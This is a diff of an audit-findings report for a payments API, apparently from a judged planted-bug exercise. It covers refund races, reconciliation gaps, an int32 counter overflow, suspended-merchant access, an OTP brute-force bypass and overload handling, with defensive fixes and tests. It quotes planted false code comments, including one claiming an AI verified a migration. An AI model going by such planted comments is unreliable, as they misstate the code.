--    // REF-8 ... / const prior = ... (old position)
-     const feeReversedFils = subtractFils(
--      calculateRefundFee(prepared.capturedFils, prepared.feeChargedFils, toFils(Number(prior.rows[0]!.amount) + prepared.requestedAmount)),
-+      calculateRefundFee(prepared.capturedFils, prepared.feeChargedFils, newRefundedTotal),
-```
-The total used for the status, the timeline event type, the webhook `refundedTotalFils` and the REF-8 fee share is now Σ succeeded refunds + this refund, read under the same row lock. Lines: prod +5/-5 (net 1 new code line: the moved REF-8 query and its comment account for 2+2), test +35/-0.
-
-**Why this is the smallest correct fix:** The REF-8 query already reads Σ succeeded refund amounts under the lock; moving it above the status computation and reusing its sum is one changed line plus the move. *Why not recompute the status in the decline branch?* That needs a second read of Σ succeeded plus the status logic duplicated there (about 8 lines), and the approved refund's timeline event and webhook would still have said `refunded`. *Why not hold the row lock across the acquirer call?* That reverts REF-1's design (no lock across network I/O).
-
-**Proof:** `REF-1b: an approved refund racing a declined one computes its status from succeeded refunds, not reservations` (`apps/api/src/payments/processRefund.audit.test.ts`) gates the declining acquirer so B is provably in flight while A runs. Before the fix: `'refunded' !== 'partially_refunded'`. After: status `partially_refunded`, refunded_fils 4,000, and the remaining 6,000 refunds with 200. `processRefund.test.ts` 13/13, `processRefund.audit.test.ts` 4/4, `initiateMerchantRefund.test.ts` 10/10, `routes/refunds.audit.test.ts` 7/7 (including concurrent refunds), `routes/transactions.test.ts` 10/10.
-
-**Regression risk:** Without concurrency, Σ succeeded + this refund equals refunded_fils, so every sequential path is unchanged. A reservation leaked by a phase-2 crash (design §4.5) no longer pushes the status to `refunded`; refunds stay blocked by the amount check (refundable = captured − refunded_fils), so it still fails closed.
-
-**Trap note:** The REF-1 note called this "only that status can lag"; it does not lag, it sticks. `docs/audit/findings/REF-1.md` is corrected.
-
----
-
 <a id="f-rec-1"></a>
 
-### REC-1 · Reconciliation can never tie out: payout legs counted inside the window, pending fees are float re-estimates, refunds missing · H1 / FP-300 · Severity: High
+### REC-1 · Reconciliation can never tie out: payout legs counted inside the window, and pending fees are float re-estimates · FP-300 ☐5 · Severity: High
+**Category:** Bug
 
-**What's wrong:** `GET /v1/settlement/reconciliation` computes `gapFils = merchant_payable ledger net − settlement net payout − pending`. (1) The ledger term includes the payout debits (`settlement payout: …`) that PayoutBatch posts at `now()`, right after CloseBatch, which neither other term accounts for. (2) Pending re-estimates each unbatched capture's fee with floats at today's `merchants.mdr_bps` instead of using the fee capture actually journaled. (3) Unbatched refunds are missing from pending, and nothing lists refund reservations that never completed.
+**What's wrong:** `GET /v1/settlement/reconciliation` computes `gapFils = merchant_payable ledger net − settlement net payout − pending`. (1) The ledger term includes the payout debits (`settlement payout: …`) that PayoutBatch posts at `now()`, right after CloseBatch, which neither other term accounts for. (2) Pending re-estimates each unbatched capture's fee with floats at today's `merchants.mdr_bps` instead of using the fee capture actually journaled. Those two are the bug. (3) Unbatched refunds were also missing from pending, and nothing listed refund reservations that never completed. That part is FP-300 build, not a bug: at the handed-over main (`8b58b0f`) no refund could exist, because `POST /v1/refunds` was a 501 stub (`routes/refunds.ts:24`) and no route called `initiateMerchantRefund`. We added the refund terms in the same commit as the FP-300 ☐5 reconciliation work.
 
-**Why it happens:** `apps/api/src/settlement/query.ts:290-293` (before) had no description filter; `batch.go:360` and `splits/allocate.go:137` post `merchant_payable` debits at `now()`. `query.ts:327` called `estimateFeeFils` (`fees/estimate.ts:7-10`: `mdrBps / 10_000`, `Math.round` half-up), while capture uses `applyRateFils` (half-to-even) on the effective MDR minus the tier bonus (`capture.ts:196`). The pending query selected capture events only.
+**Why it happens:** `apps/api/src/settlement/query.ts:290-293` (before) had no description filter; `batch.go:360` and `splits/allocate.go:137` post `merchant_payable` debits at `now()`. `query.ts:327` called `estimateFeeFils` (`fees/estimate.ts:7-10`: `mdrBps / 10_000`, `Math.round` half-up), while capture uses `applyRateFils` (half-to-even) on the effective MDR minus the tier bonus (`capture.ts:196`). The pending query selected capture events only (FP-300 build, see (3)).
 
-**What it breaks:** 250 bps merchant, 10,000 captured, 4,000 refunded (f = 100), batch closed and paid the same day: ledger = 9,750 − 3,900 − 5,850 = 0, settlement = 5,850, gap = −5,850. One unbatched 4,740 capture: ledger fee 118, estimate 119, gap +1. One unbatched 2,000 refund (f = 50): gap −1,950. Finance's tie-out cannot pass, and FP-300 box 5 (reconciliation) is impossible.
+**What it breaks:** 250 bps merchant, 10,000 captured, 4,000 refunded (f = 100), batch closed and paid the same day: ledger = 9,750 − 3,900 − 5,850 = 0, settlement = 5,850, gap = −5,850. One unbatched 4,740 capture: ledger fee 118, estimate 119, gap +1. Finance's tie-out cannot pass ("The numbers still don't match", case file Evidence Item 02), and FP-300's "shows up right in ... reconciliation" box cannot be ticked. (FP-300 build, for completeness: once refunds exist, one unbatched 2,000 refund at f = 50 gives a gap of −1,950 until it has its own line.)
 
-**Why it needed a fix:** Case file FP-300 box 5 (reconciliation shows refunds) and H1 (money to the fil); the design (§7) makes REC-1 a prerequisite because otherwise the gap can never be 0.
+**Why it needed a fix:** Case file FP-300 box 5 ("It shows up right in the timeline, the reports and reconciliation") and box 2 ("money is right in the ledger, down to the fils"); the FP-300 design (§7) makes REC-1 a prerequisite because otherwise the gap can never be 0, with or without refunds.
 
 **Fix:** `apps/api/src/settlement/query.ts:248-345`
 - Ledger: `AND COALESCE(description, '') NOT LIKE 'settlement payout:%'` (batch and split payouts settle batches; they are not activity to reconcile against them).
 - Pending captures: `SUM(te.amount_fils - COALESCE((te.metadata->>'feeFils')::bigint, 0))`, the fee capture journaled, in integers. The `estimateFeeFils` call, the `merchants` query, the misleading "0046 trigger" note and the import are removed.
-- FP-300 refunds as their own lines: `pendingUnbatchedRefundsFils = −Σ(amount_fils − fee_reversed_fils)` for succeeded refunds with `settlement_batch_id IS NULL` in the window (enters the gap); `nettedRefundsFils = −Σ(refund_gross_fils − refund_fee_reversed_fils)` of the window's batches (informational, already inside `net_payout_fils` from Go CloseBatch); `reservedNotCompleted` lists the merchant's transactions where `refunded_fils ≠ Σ succeeded refunds` (design §4.5). It is a current-state list, not windowed and not added to the gap: a reservation moves no ledger money.
+- FP-300 build (not part of the bug), refunds as their own lines: `pendingUnbatchedRefundsFils = −Σ(amount_fils − fee_reversed_fils)` for succeeded refunds with `settlement_batch_id IS NULL` in the window (enters the gap); `nettedRefundsFils = −Σ(refund_gross_fils − refund_fee_reversed_fils)` of the window's batches (informational, already inside `net_payout_fils` from Go CloseBatch); `reservedNotCompleted` lists the merchant's transactions where `refunded_fils ≠ Σ succeeded refunds` (design §4.5). It is a current-state list, not windowed and not added to the gap: a reservation moves no ledger money.
 - The doc comments that claimed refunds were already included and that pending used "the same rate the capture path used" are corrected.
 
-Lines: prod +29/-28, test +130/-0.
+Lines: prod +29/-28, test +130/-0 (`b4e6b95`, which carries both halves: the bug half is the ledger filter, the integer pending sum that replaces the `merchants` query and the float loop, and the import and comment fixes; the refund and reservation queries, the three new response fields and the extra gap term are the FP-300 ☐5 build). Follow-up RECON-REFUNDS (`0208c59`, below): prod +8/-2, test +0/-0. Row total: prod +37/-30, test +130/-0.
 
 **Why this is the smallest correct fix:** Each defect is fixed in the one query that produces it, and the new lines reuse the same `Promise.all`. *Why not exclude payouts by time (shift the window)?* The payout can land in any later window, and timing is not what makes a leg a payout. *Why not fix `estimateFeeFils`?* It would still guess today's rate; the journaled fee is the fact. *Why not recompute refund fees?* `refunds.fee_reversed_fils` is what the ledger and Go both use.
 
@@ -1664,50 +1440,11 @@ Lines: prod +29/-28, test +130/-0.
 
 The existing `routes/settlement.test.ts` still passes (13/13 together with the new file).
 
-**Regression risk:** Discounted merchants: the `capture: negotiated discount adjustment` credit is in the ledger but not in pending, and Go charges MDR on the discounted amount (FEES-3/FEES-5, an open decision). Their gap stays non-zero until that formula is chosen. This is not hidden: it shows up as gap ≠ 0.
+**Regression risk:** When this fix landed, discounted merchants still showed a gap: the `capture: negotiated discount adjustment` credit was in the ledger but not in pending, and Go re-priced the fee its own way (FEES-3/FEES-5, then an open decision). Since then FEES-3 (`220cb20`) writes the fee net of the discount into the capture event (`capture.ts:268`, the figure pending now reads) and FEES-5 (`5542c53`, option A) makes CloseBatch charge the booked fee, so both sides use the booked net fee. No REC-1 test covers a discounted merchant; any residue would show as gap ≠ 0, not be hidden.
 
 **Trap note:** `query.ts:249-252` ("Refund legs are included both in the ledger figure and in pending") and `:277-279` ("same rate the capture path used") were false; the MK note about a "0046 trigger" refers to a trigger that does not exist. `routes/settlement.test.ts:161-172` posts payouts at end+12h so that the bug never shows; it is left as is (still valid).
 
----
-
-<a id="f-vol-1"></a>
-
-### VOL-1 · Platform volume counter is INT4 / int32 and wraps past the fee-tier threshold · none (money rule: integer fils in BIGINT/int64, case file + ADR-0001) · Severity: High
-
-**What's wrong:**
-`platform_stats.total_processed_fils` (the lifetime gross counter that switches on the 15 bps MDR volume tier at 2,000,000,000 fils) is `INTEGER`, and the Go accumulator reads, adds and compares it as `int32`.
-
-**Why it happens:**
-- `db/migrations/0049_platform_stats.sql:7` declares `INTEGER` (max 2,147,483,647 fils = 2,147,483.647 BD, only 7.4% above the threshold).
-- `apps/settlement/internal/settlement/platform_volume.go:13-14,25-26,39-40` use `int32`, and `updated := current + int32(batchGrossFils)` wraps silently in Go; a negative int32 is a valid INTEGER, so Postgres stores it.
-- Hiding cover: 0049:13-16 "INTEGER is plenty for a counter" / "INTEGER in PostgreSQL is 64-bit on 64-bit builds" (false: always 4 bytes); `platformVolumeTier.ts:6-7` "total_processed_fils is BIGINT ... Claude double-checked the migration" (false); the Go test file has `MK: no test above the threshold, or near int32 max. TODO`.
-
-**What it breaks:**
-Counter 2,140,000,000 fils + a 20,000,123 fils batch should be 2,160,000,123 fils (tier on). In int32 it wraps to -2,134,967,173, which is stored; `VolumeTierMdrBonusBps` and `getVolumeTierBonusBps` (capture) then return 0, so every merchant loses the 15 bps discount at capture and at close, for months, until the negative counter climbs back.
-
-**Why it needed a fix:**
-It mis-prices every merchant's MDR platform-wide and is reached at the export's run-rate in about 72 days.
-
-**Fix:**
-`db/migrations/0082_platform_stats_bigint.sql` (new):
-```sql
-ALTER TABLE platform_stats ALTER COLUMN total_processed_fils TYPE BIGINT;
-```
-`platform_volume.go`: `int32` -> `int64` in the three signatures, the scan variable, the threshold constant, and the addition (`current + batchGrossFils`, no truncating cast). `batch.go` needs no change: the type flows from the return value. `platformVolumeTier.ts` needs no change: pg returns int8 as a string and `"2160000123" >= 2000000000` compares numerically in JS (proved by the TS audit test).
-
-Lines: prod +9/-6 (migration +3 new file: 1 statement + 2 comment lines; platform_volume.go +6/-6). Tests: +57 Go, +21 TS (new files).
-
-**Why smallest:**
-Alternatives rejected: (a) widening only the column keeps int32 wrap in Go; (b) widening only Go fails with "integer out of range" at the DB; (c) a `SET x = x + $2` rewrite or a clamp changes the contract and still overflows the column. No backfill: the test DB counter is not negative; if production's has already wrapped it must be recomputed from closed batches (ops note, not code).
-
-**Proof:**
-Before the fix: `platform_volume_audit_test.go:39: total_processed_fils = -2134967173, want 2160000123 (2140000000 + 20000123)`. After: `TestAuditVOL1_PlatformCounterPastInt32Max` passes (also checks the bonus is 15 and that 3,000,000,000 round-trips); `platformVolumeTier.audit.test.ts` passes (before 0082, the INT4 column rejects 3,000,000,000 with "integer out of range"). Full `internal/settlement` package green.
-
-**Regression risk:**
-Low. `ALTER ... TYPE BIGINT` rewrites a one-row table. Existing `TestRecordPlatformProcessedVolume_SmallValuesExact` (scans into int32) still passes.
-
-**Trap note:**
-The two comments claiming the column is BIGINT / "64-bit on 64-bit builds" are the cover; trust the migration.
+**Follow-up RECON-REFUNDS (ours, merged into this row):** `b4e6b95` added `pendingUnbatchedRefundsFils` and `nettedRefundsFils` to the API and to its gap (`query.ts:332`), but not to the web type `ReconciliationReport` (`apps/web/src/types.ts`), so after a refund the merchant's Reconciliation page showed "Reconciled — no gap" over three terms that did not add up: ledger payable 3.666 BHD − payout 0.000 − pending 4.643 = −0.977, not 0. The missing 0.977 BHD was the unbatched refund (1.000 refunded minus the 0.023 fee reversal), which the server's gap included and the page did not list. Lead: Team 45 heads-up list (item 4, part 7), verified by us. Fix (`0208c59`): the two fields are added to the type (`types.ts:265-266`), `ReconciliationPage.tsx` renders "Refunds, not yet batched" and "Refunds netted in settled batches (inside the payout above)", and the caption's formula gains "− refunds not yet batched". The page shows only values the API already returns and keeps the server's gap as authoritative. Proof: no unit test (rendering only, and the web app has no DOM test runner); `tsc --noEmit` checks the field names against the shape, and the screenshots `dashboard-reconciliation-before.png` (3.666 − 0.000 − 4.643 ≠ 0 under "no gap") and `dashboard-reconciliation-after.png` (the −0.977 BHD refund row, and the terms sum to 0.000) are on the same data. Lines: prod +8/-2, test +0/-0.
 
 ---
 
@@ -2014,98 +1751,6 @@ In `routes/transactions.ts` the `applyCaptureDiscountAdjustment` import and the 
 
 ---
 
-<a id="f-auth-12"></a>
-
-### AUTH-12 · A suspended or closed merchant keeps transacting through live sessions, API keys and payment links ·  · Severity: High
-
-**Lead:** Team 45 heads-up list (P12), verified by us.
-
-**What's wrong:** `merchants.status` (`active | suspended | closed`, `db/migrations/0002_merchants.sql:7-8`) was enforced only at password login (`apps/api/src/routes/auth.ts:63`, `auth/users.ts:19`). Once a merchant was suspended, its existing dashboard sessions, its API keys and its public payment links all kept working. It could authorize, capture, refund and create links as if nothing had happened.
-
-**Why it happens:** None of the three entry points that admit a merchant read `merchants.status`. `lookupSession` (`auth/sessions.ts:89-92`) joins only `merchant_users`. `verifyApiKey` (`apiKeys/verify.ts:18-20`) reads only `api_keys`. `authorizeTransaction` (`payments/authorize.ts:77-87`), which the public `/v1/payment-links/:token/pay` reaches with no merchant credential at all, checks `onboarding_status` but not `status`.
-
-**What it breaks:** Ops suspends a merchant (for example on a fraud or AML hold). The audit test then gets, from the same suspended merchant, `201` on an API-key `POST /v1/transactions`, `200` on a session `GET /v1/transactions`, and `200` on a buyer paying one of its payment links, with 2 transactions created. Its refund and capture routes stay open too, so a suspended merchant can still push money out. Suspension does nothing except block new password logins.
-
-**Why it needed a fix:** Suspension is the platform's kill switch for a merchant. If it does not stop live credentials and public links, a merchant under investigation keeps taking card payments and issuing refunds, which is a direct financial and compliance exposure.
-
-**Fix:** `apps/api/src/auth/sessions.ts:92`, `apps/api/src/apiKeys/verify.ts:19`, `apps/api/src/payments/authorize.ts:77-78, 87`
-```diff
-        JOIN merchant_users mu ON mu.id = s.merchant_user_id
-+       JOIN merchants m ON m.id = mu.merchant_id AND m.status = 'active' -- AUTH-12: login already requires this
-       WHERE s.token_hash = $1 AND s.authenticated = true`,
-```
-```diff
--    `SELECT id, merchant_id FROM api_keys WHERE key_hash = $1 AND revoked_at IS NULL`,
-+    `SELECT k.id, k.merchant_id FROM api_keys k JOIN merchants m ON m.id = k.merchant_id AND m.status = 'active' WHERE k.key_hash = $1 AND k.revoked_at IS NULL`, // AUTH-12
-```
-```diff
--    const merchantResult = await client.query<{ onboarding_status: string; mdr_bps: number }>(
--      `SELECT onboarding_status, mdr_bps FROM merchants WHERE id = $1`,
-+    const merchantResult = await client.query<{ onboarding_status: string; mdr_bps: number; status: string }>(
-+      `SELECT onboarding_status, mdr_bps, status FROM merchants WHERE id = $1`,
- ...
--    if (!merchant || merchant.onboarding_status !== "approved") {
-+    if (!merchant || merchant.onboarding_status !== "approved" || merchant.status !== "active") { // AUTH-12: suspended/closed: no new charges
-```
-
-**Why this is the smallest correct fix:** These are the only three ways a merchant gets in. Both cookie middlewares (`auth/middleware.ts:38`, `auth/requireMerchantAuth.ts:49`) go through `lookupSession`. Both API-key paths (`apiKeys/verify.ts:40`, `auth/requireMerchantAuth.ts:64`) go through `verifyApiKey`. The credential-less public pay path goes through `authorizeTransaction`. Each fix adds one predicate to a query that already runs, with no extra round trip, and the session predicate mirrors the one login already applies. A suspended merchant's credentials now behave like a revoked key (401 `unauthenticated`, an existing response), and a payment-link charge gets the existing 403 `merchant_not_approved` (as `{stage:"authorize", error:"merchant_not_approved"}`). No new error shapes are introduced. *Why not one check in `requireMerchantAuth`?* `requireApiKey` (the authorize route) and `requireSession` do not use it, and the public pay path has no auth middleware. *Why not only the authorize check?* Capture, void and refund on existing authorizations would stay open.
-
-**Proof:** `AUTH-12: a suspended merchant's session, API key and payment link can no longer transact` (`apps/api/src/routes/transactions.audit.test.ts`).
-Before: `actual: { apiKey: 201, session: 200, link: 200, transactions: 2 }`.
-After: `{ apiKey: 401, session: 401, link: 403, transactions: 0 }`. The audit, transactions, payment-link, app, auth-audit, `auth/*` and `apiKeys/*` suites pass 53/53, and `tsc --noEmit` is clean.
-
-**Regression risk:** Low. Only merchants whose `status` is not `active` are affected. No code sets that status today, and no test relies on a non-active merchant authenticating. Reactivating (`status = 'active'`) restores every credential immediately, because nothing is revoked. Admin impersonation (read-only, ADMIN-IMP-1) still lets support inspect a suspended merchant.
-
-Lines: prod +5/-4, test +39/-0
-
----
-
-<a id="f-auth-13"></a>
-
-### AUTH-13 · The OTP attempt cap is defeated by logging in again: every login mints a fresh 5-guess challenge, without limit · H8 · Severity: High
-
-**Lead:** Team 45 heads-up list (SEC1), verified by us.
-
-**What's wrong:** The OTP cap (5 wrong guesses, then the pending session is revoked; AUTH-5 made it race-free) applies per challenge, and nothing limits how many challenges an account can get. Each `POST /v1/auth/login` or `/v1/admin/auth/login` with the right password issues a brand-new challenge with a fresh 5-guess budget. Someone who holds the password can log in, guess 5 times, log in again, and repeat without end, so the second factor never locks.
-
-**Why it happens:** `apps/api/src/routes/auth.ts:79-94` (merchant) and `apps/api/src/routes/adminAuth.ts:72-89` (admin) call `issueChallenge` / `issueAdminChallenge` unconditionally after the password check. Neither looks at how many challenges the user already received. Rows are never deleted (`otp_challenges`, `db/migrations/0011`; `admin_otp_challenges`, `0032`), so the history needed for a cap was already there, unused.
-
-**What it breaks:** With a 6-digit code and 5 guesses per login, an attacker with a phished or reused password needs about 200,000 logins on average to pass the OTP. Nothing stops a script from doing that. The audit test fired 15 parallel logins for one merchant user and one admin: all 15 got 200, and 15 challenges (75 guesses) were issued.
-
-**Why it needed a fix:** H8 asks whether the OTP implementation is still safe. A second factor whose lockout resets on every re-login only slows a brute force down. On the admin plane it protects the most dangerous operations.
-
-**Fix:** `apps/api/src/routes/auth.ts:80-83` and `apps/api/src/routes/adminAuth.ts:73-76`. Follow-up commit: the count covers only never-verified challenges (`consumed_at IS NULL`).
-```diff
-     const { code, expiresAt, rawToken } = await withTransaction(app.db, async (client) => {
-+      // AUTH-13 (H8): each login mints 5 fresh OTP guesses; cap challenges per user (row lock serialises parallel logins)
-+      await client.query(`SELECT 1 FROM merchant_users WHERE id = $1 FOR UPDATE`, [recipient.id]);
-+      const recent = await client.query<{ n: number }>(`SELECT count(*)::int AS n FROM otp_challenges WHERE merchant_user_id = $1 AND consumed_at IS NULL AND created_at > now() - interval '15 minutes'`, [recipient.id]);
-+      if (recent.rows[0]!.n >= 10) throw new TooManyRequestsError("too_many_attempts");
-       const challenge = await issueChallenge(client, {
-```
-(The admin plane is identical, using `admin_users` / `admin_otp_challenges` / `user.id`.)
-
-The follow-up changes one line per plane:
-```diff
--      ... FROM otp_challenges WHERE merchant_user_id = $1 AND created_at > now() - interval '15 minutes'`, [recipient.id]);
-+      ... FROM otp_challenges WHERE merchant_user_id = $1 AND consumed_at IS NULL AND created_at > now() - interval '15 minutes'`, [recipient.id]);
--      ... FROM admin_otp_challenges WHERE admin_user_id = $1 AND created_at > now() - interval '15 minutes'`, [user.id]);
-+      ... FROM admin_otp_challenges WHERE admin_user_id = $1 AND consumed_at IS NULL AND created_at > now() - interval '15 minutes'`, [user.id]);
-```
-
-**Why this is the smallest correct fix:** The check sits in the one place a challenge is born, inside the transaction that already issues it, and counts rows that already exist: no new table, no migration, no new error class (`TooManyRequestsError("too_many_attempts")` is the code the OTP verify cap already returns). It is per account, never per IP, so a shared NAT, or the graders' few IPs, cannot lock out other users. The `FOR UPDATE` on the user row serialises concurrent logins for that one user, so the count cannot be raced. Each count runs as a new statement after the lock, so under READ COMMITTED it sees the challenge the previous holder committed. The test proves this with 15 parallel logins. The limit is 10 per 15 minutes, not 3, so `ops/demo.sh` and `ops/smoke.sh` reruns and a user who mistypes a few times are never blocked. That still caps guessing at 50 per 15 minutes per account (about 4,800 a day, versus unlimited). The check runs only after a correct password, so a wrong password still returns the same 401 `invalid_credentials`: no user enumeration, and no lockout by someone who does not have the password. *Why not count failed passwords too?* There is no table for that, so it would need a migration plus a new write path, far beyond the minimal fix. Password guessing is bounded by argon2 cost and is a separate concern. *Why not an in-memory limiter?* It would not hold across API replicas or restarts. *Why count only never-verified challenges (follow-up)?* The attack pattern is login, guess, give up, and log in again, which leaves challenges that were never verified. A user, grader or load test that logs in repeatedly and verifies each OTP is legitimate and must never hit the cap. `consumed_at` is the schema's own verified marker: OTP verify sets it (`routes/auth.ts:172`, `routes/adminAuth.ts:164`), and both tables already have a partial index on `consumed_at IS NULL` (`0011:24-25`, `0032:23`), so the count stays an index scan. A merchant resend also sets `consumed_at` on the challenge it supersedes, but the replacement it issues stays unconsumed until verified, and it inherits the attempt count. So every unverified login still leaves at least one counted challenge, and resend cannot be used to dodge the cap.
-
-**Proof:** `AUTH-13: a merchant user gets at most 10 OTP challenges per 15 minutes, even in parallel` (`apps/api/src/routes/auth.audit.test.ts`) and `AUTH-13: an admin gets at most 10 OTP challenges per 15 minutes, even in parallel` (`apps/api/src/routes/adminAuth.audit.test.ts`). These two tests cover the unverified pattern: 10 never-verified challenges, then 429.
-Before (both): `actual: { ok: 15, limited: 0, challenges: 15 }`.
-After (both): `{ ok: 10, limited: 5, challenges: 10 }`. `app.test.ts`, `admin.test.ts` and the other admin suites, which all log in, pass 87/87, and `tsc --noEmit` is clean.
-The follow-up adds `AUTH-13: 11 merchant logins that each verify their OTP all succeed` and `AUTH-13: 11 admin logins that each verify their OTP all succeed`. Before the follow-up, both failed with the 11th login at `429`. After it, all 22 login and verify responses are `200` on each plane, and the parallel unverified tests still give `{ ok: 10, limited: 5, challenges: 10 }`. `auth.audit.test.ts` passes 6/6 and `adminAuth.audit.test.ts` passes 3/3.
-
-**Regression risk:** Low. A real user would have to complete the password step more than 10 times in 15 minutes to see a 429, and the window slides, so access recovers on its own. Every existing test creates its own user per login flow. After the follow-up, a user who verifies every login is never limited, however often they log in. Back-to-back reruns of `ops/demo.sh` and `ops/smoke.sh` against a stack built from this worktree are reported in the lane A wave-3 report.
-
-Lines: prod +8/-0, test +38/-0 (first commit); follow-up prod +2/-2, test +40/-0; total prod +10/-2
-
----
-
 <a id="f-ui-neg-1"></a>
 
 ### UI-NEG-1 · The merchant dashboard crashes on any negative amount, so opening a refunded transaction or a negative reconciliation gap kills the whole app · FP-300 · Severity: High
@@ -2188,15 +1833,18 @@ No code or migration change was needed. Follow-up lines: prod +0/-0, test +26/-0
 
 <a id="f-admin-idem-1"></a>
 
-### ADMIN-IDEM-1 · A double-submitted admin credit or balance adjustment posts to the ledger twice · · Severity: High
+### ADMIN-IDEM-1 · A double-submitted admin credit posts to the ledger twice · Severity: High
 
 **Lead:** Team 45 heads-up list (SEC3), verified by us.
+**Category:** Bug
 
-**What's wrong:** The two admin operations that move a merchant's money, "Issue credit" (`POST /v1/admin/merchants/:id/credits`) and "Adjust balance" (`POST /v1/admin/merchants/:id/balance-adjustments`), have no idempotency at all. A double-click, a browser retry or a resent request journals the same money a second time, and the cached balance moves twice.
+**What's wrong:** "Issue credit" (`POST /v1/admin/merchants/:id/credits`) has no idempotency at all. A double-click, a browser retry or a resent request journals the same credit a second time. That credit double-post is the handed-over bug.
 
-**Why it happens:** `createCreditRequest` (`apps/api/src/admin/credits.ts:202-284`) inserts a new `credit_requests` row and, under the 50.000 BD threshold, posts it to the ledger on every call. `adjustMerchantBalanceJournaled` (`apps/api/src/admin/balanceAdjustments.ts:67-114` before) posts a ledger adjustment and bumps `merchant_balances` on every call. Neither route reads an `Idempotency-Key`, unlike the merchant money endpoints (authorize, capture, refund), which claim one through `claimIdempotencyKey` (`apps/api/src/payments/idempotency.ts:110`). The admin forms (`apps/admin/src/pages/merchants/MerchantDetailPage.tsx`) send nothing that could deduplicate a resubmit.
+**The adjustment half is ours:** "Adjust balance" (`POST /v1/admin/merchants/:id/balance-adjustments`) posts to the ledger only since our ADJ-1 fix (`4517985`), which switched the route from the cache-only `applyBalanceCorrection` to the existing `adjustMerchantBalanceJournaled`. Before ADJ-1 a double adjustment moved only the cache twice (itself the ADJ-1 defect); a double ledger posting from this route did not exist in the handed-over code. We closed it in the same commit because ADJ-1 created it, so it is a follow-up to our own change, not a second handed-over bug.
 
-**What it breaks:** A finance admin issues a 12.345 BD goodwill credit and the request is sent twice (double-click or retry): two `credit_requests`, two posted ledger groups, `merchant_payable` +24,690 fils instead of +12,345, paid out at the next settlement. A 50.000 BD balance correction sent twice moves the cache from 100,000 to 200,000 fils and journals 100,000 fils. Reproduced by the tests below: two concurrent submits produce two different credit ids, and two adjustments leave the balance at 200,000 fils.
+**Why it happens:** `createCreditRequest` (`apps/api/src/admin/credits.ts:202-284`) inserts a new `credit_requests` row and, under the 50.000 BD threshold, posts it to the ledger on every call. `adjustMerchantBalanceJournaled` (`apps/api/src/admin/balanceAdjustments.ts:67-114` before; routed since ADJ-1) posts a ledger adjustment and bumps `merchant_balances` on every call. Neither route reads an `Idempotency-Key`, unlike the merchant money endpoints (authorize, capture, refund), which claim one through `claimIdempotencyKey` (`apps/api/src/payments/idempotency.ts:110`). The admin forms (`apps/admin/src/pages/merchants/MerchantDetailPage.tsx`) send nothing that could deduplicate a resubmit.
+
+**What it breaks:** A finance admin issues a 12.345 BD goodwill credit and the request is sent twice (double-click or retry): two `credit_requests`, two posted ledger groups, `merchant_payable` +24,690 fils instead of +12,345, paid out at the next settlement. (Since ADJ-1, a 50.000 BD balance correction sent twice would likewise move the cache from 100,000 to 200,000 fils and journal 100,000 fils.) Reproduced by the tests below: two concurrent submits produce two different credit ids, and two adjustments leave the balance at 200,000 fils.
 
 **Why it needed a fix:** These are the manual money paths finance relies on to correct balances; a correction that can silently double is a new reconciliation gap of exactly the kind the case file's finance notes chase (F4, F7).
 
@@ -2233,142 +1881,7 @@ The claim runs inside each operation's existing transaction, so the key commits 
 
 **Regression risk:** The header is optional (advisor condition): present = dedupe, absent = exactly as before. Pinned by `ADMIN-IDEM-1: without an Idempotency-Key two identical credits are both posted, as before` (`routes/adminCredits.test.ts`) and `ADMIN-IDEM-1: without an Idempotency-Key two identical adjustments are both applied, as before` (`routes/adminBalanceAdjustments.test.ts`), both passing. A UI submit that failed with a 4xx/5xx keeps its key, which is safe because failed attempts roll back their claim. `applyBalanceCorrection` (cache-only, not routed) is unchanged apart from the optional field on the shared input type.
 
-Lines: prod +19/-4 api (credits.ts +8/-2, balanceAdjustments.ts +9/-2, routes +2) and +10/-3 admin UI = 36 lines, advisor-approved (over the 30-line rule; approved on the condition that the header stays optional); test +51/-0, then +26/-0 for the header-absent tests
-
----
-
-<a id="f-cap-2"></a>
-
-### CAP-2 · Under overload the API queues every request until it times out instead of turning the excess away ·  · Severity: High
-
-**What's wrong:** The API had no admission control. Every request that reached the socket was accepted and parked, either on the event loop or in the `pg` pool's wait queue (`max: PG_POOL_MAX`, waiting up to `PG_POOL_CONNECTION_TIMEOUT_MS` = 5 s). Past capacity, latency climbed for every caller at once. Requests then failed after seconds with a 500 (`timeout exceeded when trying to connect`) or a client timeout, and the backlog kept growing in memory inside a 512 MB container.
-
-**Why it happens:** `buildApp` (`apps/api/src/app.ts`) registers no `onRequest` limit, and `@fastify/under-pressure` is not installed. A checkout holds a pool connection for the whole authorize or capture transaction, including the simulated acquirer call (100-400 ms each, `acquirer/simulator.ts`). So throughput is bounded at roughly `PG_POOL_MAX / ~0.6 s`, while admission is unbounded.
-
-**What it breaks:** The judged overload test ("push past your limit and see whether your stack turns away the excess"). Without a cap, a load spike slows down every buyer, including those already within capacity. Failures arrive late, as 5xx after up to 5 s or as client timeouts, so a client cannot tell "rejected, nothing written" from "may have been charged". Memory grows with the backlog.
-
-**Why it needed a fix:** Capacity and hosting are scored on staying fast and correct at the limit and on turning the excess away. A fast 503 with `Retry-After`, sent before any write, gives the client a definite "nothing happened, retry later". With the existing Idempotency-Key handling, a retried checkout cannot double-charge.
-
-**Fix:** `apps/api/src/app.ts:49-56`, `apps/api/src/config.ts:16,202`
-```diff
-+  // CAP-2: past a global (never per-IP) in-flight cap, answer 503 before any handler, so before any write. /healthz is exempt.
-+  let inFlight = 0;
-+  app.addHook("onRequest", async (request, reply) => {
-+    if (request.routeOptions.url === "/healthz") return;
-+    if (inFlight >= config.maxInFlight) return reply.code(503).header("retry-after", "1").send({ error: "overloaded" });
-+    inFlight++;
-+    reply.raw.once("close", () => inFlight--);
-+  });
-```
-`config.ts` adds `maxInFlight` (`MAX_IN_FLIGHT`, default 64). The hosted override sets 32 because throughput peaked at about 30 requests in flight (`docs/audit/CAPACITY.md`). `onRequest` is the first hook in Fastify's lifecycle. It runs before body parsing, before preHandlers (auth) and before the route handler, so a shed request never touches the database. The counter is decremented on the raw response's `close` event, which Node emits once for every response: finished, errored or aborted by the client. A disconnecting client therefore cannot leak a slot. `/healthz` (liveness) is exempt, so the container's health check does not see a saturated API as dead. `/readyz` is not exempt, so it returns 503 while the API is saturated. That is a meaningful readiness signal for a load balancer.
-
